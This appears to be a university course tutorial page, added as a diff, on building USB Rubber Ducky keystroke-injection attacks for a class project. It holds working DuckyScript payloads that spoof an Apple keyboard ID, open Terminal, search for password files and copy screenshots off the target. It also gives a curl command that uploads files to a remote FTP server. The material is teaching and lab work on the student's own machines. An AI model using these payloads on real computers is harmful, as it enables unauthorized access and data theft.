@@ -1,0 +1,993 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN"
+	"http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en">
+<head>
+  <meta http-equiv="Content-Type" content="text/html; charset=utf-8"/>
+
+  <title>Radical Software, Fall 2026: Project 2, Tutorial 1</title>
+
+  <link rel="stylesheet" type="text/css" href="css/style.css" />
+  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.7.1/jquery.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/js-cookie@3.0.5/dist/js.cookie.min.js"></script>
+  <script src="js/links.js"></script>
+</head>
+
+<body>
+
+  <div class="main">
+
+    <p class="nav">
+      <a href="index.html">Home</a> | <a href="schedule.html">Schedule &amp; Readings</a> | <a href="resources.html">Links &amp; Resources</a>
+    </p>
+    
+    <p style="float: right;">
+      [ Links open in: <span id="window-same" class="selected">same window</span> | <span id="window-new">new window</span> ]
+    </p>
+
+
+    <div class="horizontal-rule"></div>
+
+    <h1>Radical Software</h1>
+    <p>
+      MCST 294-02 / COMP 194-03, Fall 2026<br/>
+      Rory Solomon <br />
+    </p>
+
+    <div class="horizontal-rule"></div>
+
+    <h2>Project 2, Keystroke Injection Attack</h2>
+
+    <h2>Tutorial 1</h2>
+
+    <p>
+      This page includes a handful of techniques that you might want
+      to use for this project.
+    </p>
+
+    <p>
+      Reminder that you can find
+      a <a href="https://drive.google.com/file/d/1X0rSNhgOvkiclKqZLctOA4om5Ie_WhSz/view?usp=drive_link">PDF
+      of the project assignment here</a>.
+    </p>
+    
+
+    <h3 id="table-of-contents">Table of contents</h3>
+    <ol class="table-of-contents">
+      <li>
+	<a href="#overview">Overview</a>
+      </li>
+      <li>
+	<a href="#basic-workflow">Basic workflow</a>
+      </li>
+      <li>
+	<a href="#access-as-storage">Accessing device as USB storage</a>
+      </li>
+      <li>
+	<a href="#attackmode">Updating the <code>ATTACKMODE</code></a>
+      </li>
+      <li>
+	<a href="#preventing-the-popup">Preventing the keyboard identification popup</a>
+      </li>
+      <li>
+	<a href="#screenshots">Screenshots</a>
+      </li>
+      <li>
+	<a href="#command-line">Command line</a>
+      </li>
+      <li>
+	<a href="#opening-popups">Opening popups</a>
+      </li>
+      <li>
+	<a href="#accessing-files">Accessing files</a>
+	<ol class="contents-sublist" >
+	  <li>
+	    <a href="#listing">Listing files with <code class="cli">ls</code></a>
+	  </li>
+	  <li>
+	    <a href="#linking">Linking commands together with pipe (<code class="cli">|</code>)</a>
+	  </li>
+	  <li>
+	    <a href="#selecting">Selecting parts of the output of a command with <code class="cli">head</code></a>
+	  </li>
+	  <li>
+	    <a href="#filename">Putting the above together to get a filename</a>
+	  </li>
+	  <li>
+	    <a href="#variable">Saving the filename to use later with shell variables</a>	    
+	  </li>
+	  <li>
+	    <a href="#find">Regular files only and more advanced filtering with <code class="cli">find</code></a>
+	  </li>
+	  <li>
+	    <a href="#putting-it-together">Putting it all together</a>
+	  </li>
+	</ol>
+      </li>
+      <li>
+	<a href="#exfiltration">Data exfiltration</a>
+	<ol class="contents-sublist" >
+	  <li>
+	    <a href="#copying-file">Physical Medium Exfiltration: Copying files to your Rubber Ducky</a>
+	  </li>
+	  <li>
+	    <a href="#copying-file-class-command">Physical Medium Exfiltration: Copying files to your Rubber Ducky using the in-class command</h3>
+	  </li>
+	  <li>
+	    <a href="#file-to-server">Network Medium Exfiltration: Transfering files to a server</a>
+	  </li>
+	</ol>
+      </li>
+    </ol> <!-- Table -->
+    
+    <h3 id="overview">01. Overview</h3>
+
+    <p>
+      Remember that you can do anything with DuckyScript that you can
+      do with a keyboard &mdash; which is more or less just about
+      anything that you can do on a computer! 
+    </p>
+    <p>
+      You might want to experiment with things you can do with
+      keyboard only &mdash; i.e. without using the mouse to click on
+      items in the GUI. You may find that there is a suprpisingly huge
+      amount of things you can do without your mouse! Start
+      experimenting with them.
+    </p>
+
+    <p>
+      On Mac, we can go into System Preferences, then Keyboard, then
+      click "Keyboard Shortcuts" and explore all the various keyboard
+      shortcuts that your system has configured. If you don't have a
+      lot of custom shortcuts configured, these should be the same as
+      most other users.
+    </p>
+
+    <div class="image" style="width: 400px;">
+      <a href="images/project2 - Mac keyboard shortcuts.png">
+	<img src="images/project2-1 - Mac keyboard shortcuts.png" style="width: 400px;"/>
+      </a>
+      <em>(Click to enlarge.)</em>
+    </div>
+
+    <p>
+      You could also simply search online for other standard keyboard
+      shortcuts for your OS. Explore and get creative!
+    </p>
+
+
+
+
+
+
+
+
+
+
+
+    <span class="table-of-contents">(<a href="#table-of-contents">jump back up to table of contents</a>)</span>
+    <h3 id="basic-workflow">02. Basic workflow</h3>
+
+    <p>
+      The basic workflow that you will use as you work on this project
+      will be:
+      <ol style="list-style: decimal; text-indent: 0;">
+	<li>
+	  Connect your Rubber Ducky
+	</li>
+	<li>
+	  Edit code in the
+	  <a href="https://documentation.hak5.org/payload-studio">Hak5 Payload Studio</a>
+	</li>
+	<li>
+	  Click <code class="cli">Generate Payload</code> to compile
+	  your code and produce
+	  and <code class="cli">inject.bin</code> file
+	</li>
+	<li>
+	  Click <code class="cli">Download</code> to save the
+	  new <code class="cli">inject.bin</code> file to your
+	  computer
+	</li>
+	<li>
+	  And finally, copy that file to the root folder of your
+	  Rubber Ducky device acting as USB storage. If prompted, you
+	  should <code class="cli">Replace</code> the
+	  current <code class="cli">inject.bin</code> in that
+	  location.
+	</li>
+	<li>
+	  At this point, you should probably
+	  delete <code class="cli">inject.bin</code> from your
+	  Downloads folder (so that next time you download it, you
+	  don&apos;t get awkard filenaems
+	  like <code class="cli">inject (1).bin</code> or similar).
+	</li>
+      </ol>
+
+    <p>
+      At that point, you should be able click eject, remove the device
+      your computer, and connect it to a target machine (your own
+      laptop or a different one) to test your attack.
+    </p>
+    
+    <p>
+      The Payload Studio is a web-based <strong>IDE (integrated
+	development environment</strong> for the USB Rubber Ducky,
+      which you can use to write <strong>Ducky Script</strong>, the
+      custom scripting language developed for this device. Payload
+      Studio is available here:
+    </p>
+    <p>
+      <a href="https://payloadstudio.com/community/">payloadstudio.hak5.org/community</a>
+    </p>
+
+    <p>
+      You can find the <code class="cli">Generate</code> button here:
+      <div class="image">
+	<img src="images/project2-1 - payloadstudio - generate.png" />
+      </div>
+    </p>
+
+    <p>
+      After clicking <code class="cli">Generate</code>, you should see
+      something like this:
+      <div class="image">
+	<img src="images/project2-1 - payloadstudio - compiling.png" />
+      </div>
+    </p>
+
+    <p>
+      After compiling is done, you should be able to find
+      the <code class="cli">Download</code> button here (you may need
+      to scroll down):
+      <div class="image">
+	<img src="images/project2-1 - payloadstudio - download.png" />
+      </div>
+    </p>
+
+
+
+
+
+
+
+
+
+
+
+
+    <h3 id="access-as-storage">03. Accessing device as USB storage</h3
+
+    <p>
+      Your device will hopefully show up as a USB storage device when
+      you first plug it in. If it does not, you&apos;ll have to pry open
+      the case, and right after plugging it in, press the little
+      button. That should then make sure it shows up as USB
+      storage. But unless you update the <code>ATTACKMODE</code>, you
+      will face this problem when you unplug and reinsert the
+      device.
+    </p>
+
+
+
+
+
+
+
+
+
+    <h3 id="attackmode">04. Updating the <code>ATTACKMODE</code></h3>
+    
+    <p>
+      The device has two possible <strong>attack modes</strong>:
+      acting as a USB storage device (<code>STORAGE</code>), and
+      acting as a keyboard (<code>HID</code>, for <strong>human input
+      device</strong>).
+    </p>
+    <p>
+      When your project is in development, you will probably want the
+      device to always be in <em>both</em> modes. That is because the
+      device has to show up as a USB storage device for you to upload
+      new code onto it. And while your project is in development, you
+      will probably be wanting to update, re-upload, and re-test your
+      code quite a bit. 
+    </p>
+    <p>
+      When you have the project ready to go, you will definitely want
+      it to be in <code>HID</code> attack mode (so that your script
+      will run on the <strong>target</strong> machine), but you may or
+      may not also want to have it in <code>STORAGE</code> mode,
+      depending on the nature of your attack.
+    </p>
+    <p>
+      To set the <strong>attack mode</strong> of your device, use the
+      Ducky Script command <code>ATTACKMODE</code>. This should be the
+      first line of your code file (although putting it after
+      any <code>REM</code> comments is OK, and probably actually a
+      good idea).
+    </p>
+    <p>
+      To turn on both modes, use the following command:
+    </p>
+    <pre class="cli">
+ATTACKMODE STORAGE HID
+</pre>
+
+
+
+
+
+
+
+
+
+    
+
+    <span class="table-of-contents">(<a href="#table-of-contents">jump back up to table of contents</a>)</span>
+    <h3 id="preventing-the-popup">05. Preventing the keyboard identification popup</h3>
+
+    <p>
+      First off, before getting creative with some keyboard shortcuts,
+      let&apos;s try to remedy that keyboard identification pop-up that we
+      see when we connect a Rubber Ducky to a Mac target for the first
+      time. As explained by the Hak5 documentation
+      in <a href="https://documentation.hak5.org/hak5-usb-rubber-ducky/attack-modes-constants-and-variables/attack-modes">this
+      article on Attack Modes</a>, that popup window that we often see
+      is because Mac cannot identify the type of keyboard device being
+      connected. You can prevent this by faking a device identifier
+      using the <code >ATTACKMODE</code> command, like
+      this:
+      
+      <pre>
+ATTACKMODE HID VID_05AC PID_021E
+</pre>
+      So you might want to add that as the first line of any scripts.
+    </p>
+
+    <p>
+      If that doesn&apos;t work, we could also try: <code>VID_05AC
+      PID_0221</code>, <code>VID_05AC PID_0262</code>,
+      or <code>VID_05AC PID_0267</code>.
+    </p>
+
+    <blockquote>
+      Note on formatting: In these notes, any text like this:
+      <pre>fixed width font on a blue background</pre> is valid
+      DuckyScript that you can copy/paste into the
+      Hak5 <a href="https://payloadstudio.hak5.org/community/">Payload
+	  Studio</a>, while any text like this:
+      <pre class="cli">fixed width font on a black background</pre>
+      is valid code for the command line, which you should be able
+      to copy/paste into the Terminal, <em>or</em> copy/paste into
+      DuckyScript as commands to be run in the terminal, probably
+      via the <code>STRING</code> command.
+    </blockquote>
+
+
+    <p>
+      The above <code>ATTACKMODE</code> command will put your Rubber
+      Ducky into <code>HID</code> mode, which stands for <strong>human
+      input device</strong>, i.e. acting like a keyboard. This means
+      that it will <em>not</em> be visible as a USB storage device. If
+      you want to do that, the command is:
+      <pre>
+ATTACKMODE STORAGE
+</pre>
+
+      Fortunately, the <code>ATTACKMODE</code> command allows us to
+      specify multiple modes, so to have the Rubber Ducky act like a
+      keyboard <em>and</em> a USB storage device, use the following
+      command:
+      <pre>
+ATTACKMODE STORAGE HID VID_05AC PID_021E
+</pre>
+      
+    </p>
+
+
+
+
+
+
+
+
+
+
+    <span class="table-of-contents">(<a href="#table-of-contents">jump back up to table of contents</a>)</span>
+    <h3 id="screenshots">06. Screenshots</h3>
+
+      <p>
+      Now back to thinking up some interesting keyboard shortcuts ...
+    </p>
+    
+    <p>
+      One example of some keyboard shortcuts that come to mind are the
+      various commands for making screenshots.  On Mac, the default
+      keyboard shortcut for taking screenshots is:
+      <pre>
+SHIFT COMMAND 3
+</pre>
+
+      Note that this is a default shortcut and some users may have it
+      changed. But for most Mac users, that default is probably what
+      is configured. I believe that there is a similar operation and
+      keyboard shortcut on Windows. <em>Can any Windows users share
+      with us the keyboard shortcut for this, if it exists?</em>
+    </p>
+      <p>
+      If you run that in DuckyScript, you will now have a
+      screenshot file that you can try to experiment with.
+    </p>
+    <p>
+      If you want to see the other keyboard shortcuts for screenshots,
+      or see how these shortcuts may be differently configured on a
+      given system, you can find them in the "Screenshots" section of
+      the "Keyboard Shortcuts" popup:
+      <div class="image" style="width: 400px;">
+	<a href="images/project2 - Mac keyboard shortcuts screenshot.png">
+	  <img src="images/project2-1 - Mac keyboard shortcuts screenshot.png" style="width: 400px;"/>
+	</a>
+	<em>(Click to enlarge.)</em>
+      </div>
+    </p>
+    <p>
+      The default location for a screenshot file is usually in
+      the <code class="cli">Desktop</code> folder. Below we&apos;ll see how
+      we can experiment with doing something with it.
+    </p>
+
+
+
+
+
+
+
+
+
+    
+
+    <span class="table-of-contents">(<a href="#table-of-contents">jump back up to table of contents</a>)</span>
+    <h3 id="command-line">07. The command line</h3>
+
+    <p>
+      Since this is keyboard-based attack, if you want to go beyond
+      general OS-level keyboard shortcuts you will get a lot more
+      mileage out of working within a terminal &mdash; since that is a
+      text-based interface and you will thus be able to do a lot with
+      just the keyboard there.
+    </p>
+
+    <p>
+      Once you get into the command line, you can do just about
+      anything on the computer just by using text-based commands that
+      you can execute via DuckyScript.
+    </p>
+    <p>
+      Again on Mac, you can open a Terminal by
+      typing <code class="cli">COMMAND SPACE</code> for spotlight,
+      then "Terminal", then enter. So in DuckyScript, this would be:
+      <pre>
+COMMAND SPACE
+STRINGLN Terminal
+</pre>
+
+      Although some folks in class pointed out that Spotlight can take
+      a little time to do its thing, so you might want to do something
+      like this:
+      <pre>
+COMMAND SPACE
+STRING Terminal
+DELAY 100
+ENTER
+</pre>
+
+      Remember that <code>STRINGLN</code> is just a shortcut
+      for <code>STRING</code> followed by <code>ENTER</code>. The
+      second snippet above enters the text and then waits a short bit
+      before hitting <code>ENTER</code> to give that time to
+      Spotlight.
+    </p>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+    
+    <span class="table-of-contents">(<a href="#table-of-contents">jump back up to table of contents</a>)</span>
+    <h3 id="opening-popups">08. Opening popups</h3>
+
+    <p>
+      In the command line you can type <code class="cli">open</code>
+      and then any file or URL to open that resource in the
+      appropriate application.
+    </p>
+    <p>
+      Try opening a URL:
+      <pre class="cli">
+open "https://phrack.org/issues/7/3.html"
+</pre>
+
+      You could use this technique to "RickRoll" someone, or open a
+      custom message or image that you create. If you want to do this,
+      let me know and I can host that image or webpage for you on our
+      departmental server.
+    </p>
+
+
+
+
+
+
+    
+
+    
+    <span class="table-of-contents">(<a href="#table-of-contents">jump back up to table of contents</a>)</span>
+    <h3 id="accessing-files">09. Accessing files</h3>
+
+    <p>
+      Let's experiment with command line commands and shell scripting.
+    </p>
+
+    <h4 id="listing">(a) Listing files with <code class="cli">ls</code></h4>
+    
+    <p>
+      You can list the files in a directory (i.e. a folder) with
+      the <code class="cli">ls</code> command (that's a lower-case "L").
+    </p>
+
+    <pre class="cli">
+ls
+</pre>
+
+    <p>
+      This command takes different <strong>arguments</strong>, also
+      known as <strong>parameters</strong> or <strong>flags</strong>,
+      which are usually indicated with a hyphen <code class="cli">-</code>.
+    </p>
+    <p>
+      Adding <code class="cli">-1</code> (that's the number one) to
+      the <code class="cli">ls</code> command will list all the files
+      in one single column, which makes it a little easier to work
+      with in other ways:
+    </p>
+    <pre class="cli">
+ls -1
+</pre>
+
+    <h4 id="linking">(b) Linking commands together with pipe (<code class="cli">|</code>)</h4>
+    <p>
+      The real magic and power of working in the command line comes
+      from using something called the <strong>pipe</strong> command,
+      specified with a vertical line usually refered to as
+      a <strong>bar</strong>: <code class="cli">|</code>. On my
+      keyboard, you can find that by typing SHIFT and backslash
+      (<code class="cli">\</code>), which is above the RETURN key.
+    </p>
+    <p>
+      This tool let's you take the output from one command and send it
+      as the input to another command.
+    </p>
+
+
+
+    <h4 id="selecting">(c) Selecting parts of the output of a command with <code class="cli">head</code></h4>
+    <p>
+      Another useful command in this case
+      is <code class="cli">head</code>. This returns only the first
+      number of lines from a file. For example, if I had a file
+      named <code class="cli">data.txt</code> that contained the
+      following:
+      <pre>
+Hello my name is Gritty
+I am orange
+I am a monster
+I like hockey
+I like pranks
+</pre>
+      and you typed <code class="cli">head -2 data.txt</code>, you
+      would get the following output:
+      <pre>
+Hello my name is Gritty
+I am orange
+</pre>
+    </p>
+
+
+
+
+
+
+    <span class="table-of-contents">(<a href="#table-of-contents">jump back up to table of contents</a>)</span>
+    <h4 id="filename">(d) Putting the above together to get a filename</h4>
+    
+    <p>
+      Putting the above three things together, we can get the name of
+      one file to work with:
+
+    <pre class="cli">
+ls -1 | head -1
+</pre>
+
+    This will return the name of the first file in the current directory.
+    </p>
+
+    <p>
+      I say first, but more precisely, this will be the first file in
+      terms of whatever the default sorting is, which is
+      usually alphabetical. You can change the sort order with various
+      parameters:
+      <ul>
+	<li>
+	  &mdash; Sort by when the files were last modified (most recently
+	  first): <code class="cli">-t</code>
+	</li>
+	<li>
+	  &mdash; Sort by when the file was last accessed (most recently
+	  first): <code class="cli">-u</code>
+	</li>
+	<li>
+	  &mdash; Reverse the sort order: <code class="cli">-r</code>
+	</li>
+      </ul>
+
+      And you can combine these parameters, so to get the oldest
+      accessed file, you could do: <code class="cli">ls -1ur | head
+      -1</code>. Or combine those parameters however you'd like.
+    </p>
+    <p>
+      There is also a command called <code class="cli">sort</code>
+      which offers more sorting options, including a randomized sort
+      with the <code class="cli">-R</code> option. Use
+      the <strong>pipe</strong> command
+      with <code class="cli">ls</code> to select a random file, like
+      this:
+      <pre class="cli">
+ls -1 | sort -R | head -1
+</pre>
+      Run that few times to see what you get
+    </p>
+
+
+
+
+    <span class="table-of-contents">(<a href="#table-of-contents">jump back up to table of contents</a>)</span>
+    <h4 id="variable">(e) Saving the filename to use later with shell variables</h4>
+
+    <p>
+      In bash shell scripting, you can save the output from a command
+      into a variable with the following syntax,
+      where <code class="cli">NAME</code> is any variable name,
+      and <code class="cli">COMMAND</code> is any set of commands:
+      <pre class="cli">
+NAME="$(COMMAND)"
+</pre>
+      Putting the above together would look like this:
+      <pre class="cli">
+FILENAME="$(ls -1 | sort -R | head -1)"
+</pre>
+    
+      Now you can use that value by
+      typing <code class="cli">$FILENAME</code> in any other
+      command. We'll see some things you can do with that filename
+      below.
+    </p>
+
+
+    
+
+    
+    <h4 id="find">(f) Regular files only and more advanced filtering with <code class="cli">find</code></h4>
+    
+    <p>
+      You may have noticed that <code class="cli">ls</code> lists
+      files <em>and</em> directories (folders). So if you are in a
+      directory (folder) that contains other directories
+      (i.e. subdirectories or subfolders), then those will be
+      listed. Now if you are trying to do something with a file, you
+      may not want to possibly get a directory name.
+    </p>
+    <p>
+      Unfortunately the <code class="cli">ls</code> command does not
+      let you filter out directories, but another command does
+      called <code class="cli">find</code>, which is a very powerful
+      command that can search through all subdirectories and take many
+      different filtering options.
+    </p>
+    <p>
+      The first argument to <code class="cli">find</code> is always
+      the directory that you want to search. To just search the
+      current directory, use "<code class="cli">.</code>" (a period,
+      usually referred to as <strong>dot</strong>).
+    </p>
+
+    <p>
+      By default, <code class="cli">find</code> recursively looks
+      through all subdirectories and their subdirectories, etc. So if
+      you want to achieve similar behavior
+      to <code class="cli">ls</code>, add
+      the <code class="cli">-maxdepth 1</code> parameter. Like this:
+    </p>
+    <pre class="cli">
+find . -maxdepth 1
+</pre>
+
+    <p>
+      Now we can add a filter so that <code class="cli">find</code>
+      only returns <strong>regular files</strong>, i.e. not
+      directories. For this, use the <code class="cli">-type</code>
+      option, like this, with <code class="cli">f</code> for "file":
+    </p>
+    <pre class="cli">
+find . -maxdepth 1 -type f
+</pre>
+        
+    <p>
+      <em>NOTE:</em> If you leave
+      out <code class="cli">-maxdepth</code>, it will search through
+      all subdirectories, which, depending on what folder you're in
+      could be a lot!!! To stop this command (or any command) from
+      running, hit CONTROL-C.
+    </p>
+
+    <p>
+      Both <code class="cli">ls</code>
+      and <code class="cli">find</code> can accept a
+      different <strong>path</strong> naming the directory that you
+      want to search. For example, try
+      <pre class="cli">
+ls /Applications
+</pre>
+      or
+      <pre class="cli">
+find /Applications -maxdepth 1
+</pre>
+      to see a list of what applications are installed on this system.
+    </p>
+    <p>
+      Now with <code class="cli">ls</code>, this isn&apos;t quite as
+      useful for what we&apos;re trying to do because that only
+      returns a filename. But <code class="cli">find</code> returns
+      the <strong>full path</strong>, which is what we would need if
+      we wanted to access this file in some way.
+    </p>
+
+    <p>
+      <code class="cli">find</code> also lets you filter in all kinds
+      of ways. You can look these up online. But one technique we can
+      look at here is by name.
+    </p>
+    <p>
+      You can use the <code class="cli">-name</code> parameter to look
+      only for a specific filename, or use wildcard characters to look
+      for certain patterns. For example this:
+      <pre class="cli">
+find . -maxdepth 1 -type f -name "*assword*"
+</pre>
+      will look for any regular files in the current directory that
+      could be named "Password" or "password".
+    </p>
+    <p>
+      Putting these together might be a good time to <em>not</em>
+      use <code class="cli">maxdepth</code>. For example this:
+      <pre class="cli">
+find . -type f -name "*assword*"
+</pre>
+      would look for any files in the current directory <em>or any
+      subdirectory</em> that match that filename pattern.
+    </p>
+
+
+
+    
+    <span class="table-of-contents">(<a href="#table-of-contents">jump back up to table of contents</a>)</span>
+    <h4 id="putting-it-together">(g) Putting it all together</h4>
+
+    <p>
+      Combining the above techniques, here is a command that looks for
+      all files matching this filename pattern, in
+      the <code class="cli">Documents</code> directory or any
+      subdirectory, and by sorting randomly it will return a different
+      file each time it runs, saving that in a variable:
+      <pre class="cli">
+FILENAME="$(find Documents -type f -name "*.txt" |sort -R |head -1)"
+</pre>
+      
+    </p>
+
+
+
+
+
+
+
+
+    <span class="table-of-contents">(<a href="#table-of-contents">jump back up to table of contents</a>)</span>
+    <h3 id="exfiltration">07. Exfiltration</h3>
+
+      <p>
+	Now that we have a variable containing a filename, we can do
+	many things with it. 
+      </p>
+      
+      <p>
+	<strong>Exfiltration</strong> is the cybersecurity term for
+	the unauthorized transfer of data from a computer
+	(<a href="https://en.wikipedia.org/wiki/Data_exfiltration">wikipedia</a>).
+      </p>
+      
+      <p>
+	The USB Rubber Ducky offers us two main techniques for
+	exfiltrating data that we wish to extract from a target
+	machine. The <a href="https://docs.hak5.org/hak5-usb-rubber-ducky/advanced-features/exfiltration">Hak5
+	documentation</a> calls these "Physical Medium Exfiltration"
+	and "Network Medium Exfiltration", which essentially means
+	copying files directly to the USB storage device and
+	transfering files over a network, respectively. These two
+	techniques are explained below.
+    </p>
+
+
+
+    
+
+    <h4 id="copying-file">(a) Physical Medium Exfiltration: Copying files to your Rubber Ducky</h3>
+
+    <p>
+      On Mac, a Rubber Ducky that is plugged in and in
+      the <code>STORAGE</code> <strong>attack mode</strong> will be
+      accessible in the command line
+      as <code class="cli">/Volumes/DUCKY</code>.
+    </p>
+
+    <p>
+      You can copy files with the <code class="cli">cp</code> command,
+      and using that with the filename variable above would look like
+      this:
+      <pre class="cli">
+cp $FILENAME /Volumes/DUCKY
+</pre>
+
+      With that, you should be able to pop in the Rubber Ducky, wait a
+      few seconds, pull it out, and have whatever file you've searched
+      for copied off the target machine.
+    </p>
+
+
+
+
+    <h4 id="copying-file-class-command">(b) Physical Medium Exfiltration: Copying files to your Rubber Ducky using the in-class command</h3>
+    <p>
+      This is a slightly different version of the above
+      commands. The command line instruction that we came up with
+      together was this:
+    </p>
+    <pre class="cli">
+cp "`ls -t1 Desktop/Screen* | head -1`" /Volumes/DUCKY
+</pre>
+
+    <p>
+      And putting that together with the Ducky Script program that
+      combines that into an attack that also takes a screenshot looked
+      like this:
+    </p>
+    <pre>
+REM Rory Solomon
+REM Radical Software, in-class demo, April 6, 2026
+ATTACKMODE STORAGE HID VID_05AC PID_021E
+DELAY 1000
+COMMAND SHIFT 3
+DELAY 1000
+COMMAND SPACE
+STRINGLN Terminal
+DELAY 1000
+STRINGLN cp "`ls -t1 Screen* | head -1`" /Volumes/DUCKY/
+DELAY 1000
+</pre>
+
+    <p>
+      Some people found that this didn&apos;t quite work as expected
+      because it was not listing the right folder. You may need to try
+      modifying the script like so:
+    </p>
+    <pre>
+REM Rory Solomon
+REM Radical Software, in-class demo, April 6, 2026
+ATTACKMODE STORAGE HID VID_05AC PID_021E
+DELAY 1000
+COMMAND SHIFT 3
+DELAY 1000
+COMMAND SPACE
+STRINGLN Terminal
+DELAY 1000
+STRINGLN cp "`ls -t1 <span class="new">Desktop/</span>Screen* | head -1`" /Volumes/DUCKY/
+DELAY 1000
+</pre>
+    
+
+
+
+
+
+    <span class="table-of-contents">(<a href="#table-of-contents">jump back up to table of contents</a>)</span>
+    <h4 id="file-to-server">(c) Network Medium Exfiltration: Transfering files to a server</h3>
+
+    <p>
+      In addition to copying the file to USB, we can try to copy the
+      file to a remote server.
+    </p>
+    <p>
+      I've setup an FTP server for us with an account and password
+      that we all can use. There are several different ways that you
+      could do this, but one comamnd you could use is this:
+    </p>
+    
+    <pre class="cli">
+curl --user USERNAME:PASSWORD --upload-file $MYVARIABLE ftp://SERVER
+</pre>      
+
+    <p>
+      I feel pretty lax about sharing the username, password, and
+      server name, but I still don't think it's too wise to simply
+      post it on the web for anyone to see, so I moved that info into
+      a Google Doc that only we can access. You
+      can <a href="https://docs.google.com/document/d/1GLvFFVelQilmgCLv5BxKOevw3VMs4mkyGKYrUoQEq08/edit?usp=drive_link">find
+      that here</a>.
+    </p>
+
+    <p>
+      If you try this command and want to know whether the upload
+      worked, you can download an FTP client
+      (<a href="https://filezilla-project.org/">FileZilla</a> is a
+      great, open source option; I can also
+      recommend <a href="https://panic.com/transmit/">Transmit</a>,
+      which has some better features but requires a one-time payment
+      after a 7-day trial) and login with the credentials in the
+      Google Doc file &mdash; or just ask me whether it worked.
+    </p>
+    <p>
+      I'll be checking that server and I want to see some files
+      getting uploaded!
+    </p>
+
+    <p>
+      Putting all that together, here is a sample payload I put
+      together that takes a screenshot and uploads it via FTP. You can
+      see where I've added some various <code class="cli">DELAY</code>
+      commands, based on testing and seeing how long different steps
+      took.
+    </p>
+    <p>
+      <a href="project2-sample-payload.txt">project2-sample-payload.txt</a>
+    </p>
+    <p>
+      (As above, I have not incldued the actual username, password,
+      and server name in that txt file. To see these, please
+      <a href="https://docs.google.com/document/d/13zJlE5JBVxeX3mOcWg49Looenosjm7RFxwojoFH2Fkk/edit?tab=t.0">take
+      a look at this doc here</a>.)
+    </p>
+
+
+    
+    
+    <div class="horizontal-rule"></div>
+    <script type="text/JavaScript">
+      datUpdated = new Date(document.lastModified) ;
+      document.write("Last Updated: " + datUpdated);
+    </script>
+
+    </div>
+
+</body>
+
+</html>
+
